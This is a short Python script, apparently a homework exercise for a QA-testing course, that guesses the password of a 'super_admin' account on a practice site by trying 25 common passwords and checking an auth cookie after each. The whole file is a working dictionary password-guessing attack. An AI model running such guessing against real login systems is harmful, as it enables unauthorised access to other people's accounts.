import requests

LOGIN = "super_admin"

passwords = [
    "123456", "123456789", "qwerty", "password", "1234567", "12345678", "12345",
    "iloveyou", "111111", "123123", "abc123", "qwerty123", "1q2w3e4r", "admin",
    "qwertyuiop", "654321", "555555", "lovely", "7777777", "welcome", "888888",
    "princess", "dragon", "password1", "123qwe"
]

URL_AUTH = "https://playground.learnqa.ru/ajax/api/get_secret_password_homework"
URL_CHECK = "https://playground.learnqa.ru/ajax/api/check_auth_cookie"


def try_password(login, password):

    response_auth = requests.post(URL_AUTH, data={"login": login, "password": password})
    auth_cookie = response_auth.cookies.get('auth_cookie')

    response_check = requests.get(URL_CHECK, cookies={"auth_cookie": auth_cookie})

    if response_check.text == "You are authorized":
        print(f"\nНайден верный пароль: {password}")
        print(f"Ответ сервера: {response_check.text}")
        return True

    return False

print(f"Подбор пароля для логина: {LOGIN}")

for i, password in enumerate(passwords, 1):
    print(f"[{i}/{len(passwords)}] Пробуем пароль: {password}")
    if try_password(LOGIN, password):

        break
else:
    print("\nПароль не найден в списке.")